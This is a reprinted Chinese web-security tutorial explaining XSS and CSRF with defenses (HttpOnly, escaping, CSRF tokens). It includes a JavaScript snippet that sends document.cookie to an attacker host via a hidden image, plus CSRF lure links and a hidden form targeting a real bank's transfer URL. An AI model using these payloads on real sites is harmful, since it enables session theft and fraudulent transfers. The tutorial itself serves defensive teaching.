---
title: 'Web安全防范(XSS、CSRF)' 
date: 2018-12-16 2:30:10
hidden: true
slug: 2zgipqbdc1m
categories: [reprint]
---

{{< raw >}}

                    
<blockquote>注：以下文章是我从公众号“码农翻身”中的<a href="https://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665514169&amp;idx=1&amp;sn=f6f8dffdb29c4075d094dd7203189e5b&amp;chksm=80d67cfab7a1f5ecb7daf768a0364879c0d26483fd2e595d67bcf82822c5fbb9525323956d51&amp;scene=21#wechat_redirect" rel="nofollow noreferrer" target="_blank">《黑客三兄弟》</a>抽取总结出来的，这个公众号采用说故事的方式讲解技术，清晰通俗易懂，能学到很多知识。</blockquote>
<h2 id="articleHeader0">XSS(Cross Site Scripting)</h2>
<p>利用别人的cookie，可以冒充真实的用户，在颁发cookie的那个网站中为所欲为。<br>因为浏览器的同源策略，所以不能获取到其他网站的cookie，但通过把JavaScript代码注入到目标页面中，就能绕过同源策略，比如在HTML的&lt;input&gt;中注入JavaScript代码，等到数据提交到服务器端，会保存下来，下次展示页面的时候，就会执行这段代码。<br>举例有这样一个网站，可以让你对某个文章输入评论：</p>
<p><span class="img-wrap"><img data-src="/img/bV2NZZ?w=1652&amp;h=272" src="https://static.alili.tech/img/bV2NZZ?w=1652&amp;h=272" alt="图片描述" title="图片描述" style="cursor: pointer; display: inline;"></span></p>
<p>等到再次有人访问这个页面的时候，就可以把那个人的cookie显示出来了！<br>当然不能直接把用户的cookie直接alert出来，而同源策略严格限制了JavaScript的跨域访问，但同源策略并不限制&lt;img&gt;这样的标签从别的网站（跨域）去下载图片，所以可以通过创建一个不可见的&lt;img&gt;，通过这个&lt;img&gt;发cookie到自己的服务器。<br>直接上代码：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="var img=document.createElement(&quot;img&quot;);
img.src=&quot;http://web.com/log?&quot;+escape(document.cookie);
document.body.appendChild(img);" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs javascript"><code><span class="hljs-keyword">var</span> img=<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"img"</span>);
img.src=<span class="hljs-string">"http://web.com/log?"</span>+<span class="hljs-built_in">escape</span>(<span class="hljs-built_in">document</span>.cookie);
<span class="hljs-built_in">document</span>.body.appendChild(img);</code></pre>
<p>只要这段代码被执行，用户的cookie就会发送到别人的服务器上("http://web.com/log")。再将这段代码封装成一个js文件(web.js)。</p>
<p><span class="img-wrap"><img data-src="/img/bV2NZ2?w=1646&amp;h=264" src="https://static.alili.tech/img/bV2NZ2?w=1646&amp;h=264" alt="图片描述" title="图片描述" style="cursor: pointer; display: inline;"></span></p>
<p>这样就可以拿到用户的cookie。<br>这种窃取用户的cookie的方法叫做XSS。<br>注：按照XSS的分类方法，上面介绍的叫做存储性XSS，危害最大。还有反射型XSS，基于DOM的XSS，本文不再展开。</p>
<p><strong>防范措施：</strong></p>
<p>在网站的Cookie加上HttpOnly属性：<br>Set-Cookie: JSESSIONID=xxxxxx;Path=/;Domain=book.com;HttpOnly<br>这样浏览器就禁止JavaScript的读取了。</p>
<p>当然通过页面注入JavaScript代码，那就可以不只是借Cookie了。例如可以用这个JS代码画一个假的登录框，覆盖到真的登录框之上，让用户信以为真，这样就可以偷到真实的用户名和密码了。或者通过JavaScript构造GET,POST请求，可以模拟用户在该网站做点手脚，删点什么东西，从一个账户往另一个账户转账，都是可以的。</p>
<p><strong>防范措施：</strong></p>
<p>将用户输入的特殊字符例如&lt;,&gt;过滤掉，这样&lt;script&gt;可能会变成'script'被存到数据库里。<br>另一方面还可以对输出进行编码/转义操作，例如把<code>&lt;</code>变成<code>&amp;lt;</code>，把<code>&gt;</code>变成<code>&amp;gt;</code>，浏览器收到以后，就会认为是数据，把&lt;script&gt;作为字符串给显示出来，而不是执行后面的代码！</p>
<h2 id="articleHeader1">CSRF(Cross Site Request Forgery)</h2>
<p>一个用户的会话cookie在浏览器没有关闭的时候，是不会被删除的，所以可以换个思路，不再去偷这个cookie了，相反，可以在web.com中构造一个领奖页面，里面包含一个连接，让用户去惦记，例如：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="恭喜你获得了iPhoneX一台，快来<a href=&quot;www.icbc.com.cn/transfer?toBankId=黑客的账户&amp;money=金额&quot;>领取吧</a>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code style="word-break: break-word; white-space: initial;">恭喜你获得了iPhoneX一台，快来<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"www.icbc.com.cn/transfer?toBankId=黑客的账户&amp;money=金额"</span>&gt;</span>领取吧<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>
<p>这得先知道icbc.com.cn的转账操作的url和参数名称。<br>如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了。<br>注：为了方便展示，本文举了一个非常简单的案例，银行实际的转账操作要远远比文章描述安全的多。<br>除了让用户点击外，还可以使用img标签<code>&lt;img src="www.icbc.com.cn/transfer?toAccountID=黑客三兄弟的账户&amp;money=金额"&gt;</code>，只要用户打开了这个页面，不点击任何东西，就会发生转账操作。<br>所以现在有很多邮箱默认是不显示邮件中的图片的。<br>如果icbc.com.cn的转账操作需要form表单，是POST操作，那么可以自己创建一个表单，放到一个不可见的iframe中，用户只要一访问，就用JavaScript自动提交。</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<form action=&quot;http://www.icbc.com.cn/transfer&quot; method=&quot;POST&quot;>
    <input type=&quot;text&quot; name=&quot;toAccountID&quot; value=&quot;黑客的账号&quot;/>
    <input type=&quot;text&quot; name=&quot;money&quot; value=&quot;金额&quot;/>
</form>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs accesslog"><code>&lt;form action=<span class="hljs-string">"http://www.icbc.com.cn/transfer"</span> method=<span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span>&gt;
    &lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"toAccountID"</span> value=<span class="hljs-string">"黑客的账号"</span>/&gt;
    &lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"money"</span> value=<span class="hljs-string">"金额"</span>/&gt;
&lt;/form&gt;</code></pre>
<p>总之，只要用户在访问icbc.com.cn的时候，访问了web.com，就极有可能中招，这种方式，只是利用了一下合法的Cookie，在服务器看来，发出的这个请求是一次合法的请求。这个就叫跨站请求伪造，Cross Site Request Forgest (CSRF)。</p>
<p><strong>防范措施：</strong></p>
<p>1.用户在icbc.com.cn转账，显示转账的form，除了常用的字段之外，额外添加一个token:</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<form action=&quot;http://www.icbc.com.cn/transfer&quot; method=&quot;POST&quot;>
    <input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;axsa;dsww98725678836554xskdhf82735672&quot;/>
    <input type=&quot;text&quot; name=&quot;toAccountID&quot; value=&quot;黑客的账号&quot;/>
    <input type=&quot;text&quot; name=&quot;money&quot; value=&quot;金额&quot;/>
</form>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs accesslog"><code>&lt;form action=<span class="hljs-string">"http://www.icbc.com.cn/transfer"</span> method=<span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span>&gt;
    &lt;input type=<span class="hljs-string">"hidden"</span> name=<span class="hljs-string">"token"</span> value=<span class="hljs-string">"axsa;dsww98725678836554xskdhf82735672"</span>/&gt;
    &lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"toAccountID"</span> value=<span class="hljs-string">"黑客的账号"</span>/&gt;
    &lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"money"</span> value=<span class="hljs-string">"金额"</span>/&gt;
&lt;/form&gt;</code></pre>
<p>这个token是icbc.com服务器端生成的，是一个随机的数字。</p>
<p>2.用户的转账数据发送的服务器端，icbc.com就会检查从浏览器发过来的数据中有没有token，并且这个token的值是不是和服务器端保存的相等，如果相等，就继续执行转账操作，如果不相等，那这次POST请求肯定是伪造的。</p>
<p>这个token是服务器端生成的，无法伪造，CSRF的手段也不行了。</p>

                
{{< /raw >}}

# 版权声明
本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，

本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。

原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！

## 原文标题
Web安全防范(XSS、CSRF)

## 原文链接
[https://segmentfault.com/a/1190000013022789](https://segmentfault.com/a/1190000013022789)

